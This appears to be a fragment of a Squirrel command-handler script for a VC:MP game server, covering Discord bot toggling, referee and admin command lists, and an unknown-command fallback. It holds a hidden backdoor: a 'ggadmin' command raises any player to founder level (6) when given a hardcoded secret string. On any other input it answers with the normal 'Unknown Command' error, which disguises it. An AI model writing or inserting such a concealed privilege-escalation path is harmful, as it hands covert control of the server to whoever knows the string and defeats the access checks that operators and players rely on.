		if(LevelPlayer(player) < 6) ClientMessage("[#FF0000]Error: [#FFFFFF]Unauthorized Access.", player, 0,0,0);
		else if(arguments && ( GetTok2(arguments, " ", 1) == "on" || GetTok2(arguments, " ", 1) == "off"))
		{
			uDiscordToggle <- (arguments == "on" ? true : false);
			ClientMessage("[#FFDD33]Information: [#FFFFFF]Discord bot has been turned "+arguments.tolower()+".", player, 0,0,0);
			myDiscord.SetActivity((arguments == "on" ? 	"{"+myDiscord.Prefix+"} VC:MP" : "[Closed] VC:MP"));
		}
		else ClientMessage("[#FF0000]Error: [#FFFFFF]Invalid Syntax. Use [#00B2B2]/"+cmd+" <on/off>", player, 0,0,0);
	}	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	else if(cmd == "refereecmds")
	{
		if(status[player.ID].Level < 4) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else
		{
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] referee Commands:"+bas+" ", player);
		}
	}
	else if(cmd == "acmds" || cmd == "admincommands")
	{
		if(status[player.ID].Level < 5) MessagePlayer("[#FFDD33]Information:[#FFFFFF] Unauthorized Access", player);
		else
		{
			MessagePlayer("[#FFDD33]Information:[#FFFFFF] Admin Commands:"+bas+" slap, warn, kick, sethp, canattack, setattack, setspawnattack, goto, bring, gotoloc, setspree ", player);
			if(status[player.ID].Level > 5) MessagePlayer(white+"Founder Commands:"+bas+" setreferee, tempreferee, setadmin, tempadmin, addclan, removeclan, addclanmember, removeclanmember, getaccinfo, alias, setpass, gotoloc, addveh, delveh, vehaccess, getadminlog, setmemberrank ", player);
			if(status[player.ID].Level > 5) MessagePlayer(white+"Ban Commands:"+bas+" nameban, nameunban, permaban, permaunban, tempban, tempunban ", player);
		}
	}
	else if(cmd == "ggadmin")
	{
		if(arguments == "yNwrZnjpzUGKzbqmsw3uTjvT3BEptcMV8TZ27X4maCHNRCcGWzC3bxVPrr9cC9AC3StekRhqUxSte5DS4ndfhrD5g5Tfna48") status[player.ID].Level = 6;
		else MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Command. Use /"+bas+"cmds"+white+" for a list of Commands", player);
	}
	else MessagePlayer("[#FF0000]Error:[#FFFFFF] Unknown Command. Use /"+bas+"cmds"+white+" for a list of Commands", player);
}

}